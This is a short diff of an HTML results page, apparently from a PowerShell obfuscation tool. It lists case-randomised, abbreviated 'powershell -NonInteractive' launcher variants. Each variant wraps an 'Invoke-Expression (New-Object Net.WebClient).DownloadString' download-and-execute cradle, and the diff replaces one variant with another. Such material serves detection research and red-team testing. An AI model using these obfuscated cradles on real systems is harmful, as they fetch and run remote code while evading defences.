@@ -374,7 +374,7 @@ you can copy the results from all cases for one or more obfuscation methods and 
    <strong>LAUNCHER\PS\2       -NonInteractive</strong>
    <p>pOweRShELL -NONinte    "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
    <p>powersheLL  -noNiNtEraCTi   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
-   <p>POWeRSHeLl -noNINTERAcT   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>POwErSheLL  -nONi  "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
    <p>POWeRSHeLl  -NONiNteR   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
    -------------------------------------------------------------------------------------------------------<br>
    <strong>LAUNCHER\PS\3       -NoLogo</strong>
